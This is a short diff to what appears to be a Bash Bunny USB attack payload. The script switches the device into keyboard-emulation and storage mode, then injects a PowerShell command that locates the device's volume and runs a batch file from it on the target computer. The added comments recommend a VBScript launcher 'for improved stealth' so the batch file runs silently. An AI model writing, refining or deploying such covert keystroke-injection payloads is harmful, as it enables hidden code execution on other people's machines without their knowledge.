@@ -2,5 +2,10 @@
 GET SWITCH_POSITION
 LED ATTACK
 ATTACKMODE HID STORAGE
+
+# For improved stealth, if target supports Visual Basic Script, change the
+# launch line below to launch z.cmd instead of x.cmd.
+# Documentation line from original project:
+# Executes z.cmd from the switch position's folder, thus launching x.cmd silently using i.vbs
 RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\x.cmd')"
 LED FINISH
